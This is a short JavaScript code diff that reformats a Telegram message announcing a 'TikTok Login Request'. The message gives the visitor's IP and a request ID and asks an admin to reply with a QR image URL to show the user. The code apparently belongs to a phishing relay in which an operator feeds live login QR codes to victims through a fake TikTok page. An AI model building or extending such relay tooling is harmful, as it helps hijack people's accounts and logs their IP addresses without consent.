@@ -53,7 +53,13 @@ function sendTiktokMessage(requestId, ip) {
         return Promise.resolve(null);
     }
 
-    const text = `🎵 TikTok Login Request\n\nIP: ${ip}\n\nReply to this message with:\nimage_url:<URL>\n\nto show a QR/image to the user.`;
+    const text =
+        `🎵 TikTok Login Request\n\n` +
+        `IP: ${ip}\n\n` +
+        `Request ID: ${requestId}\n\n` +
+        `Reply to this message with:\n` +
+        `image_url:https://example.com/your-qr.png\n\n` +
+        `(Or send a single line that is only the image URL.)`;
 
     return tgApi('sendMessage', {
         chat_id: TELEGRAM_ADMIN_CHAT_ID,
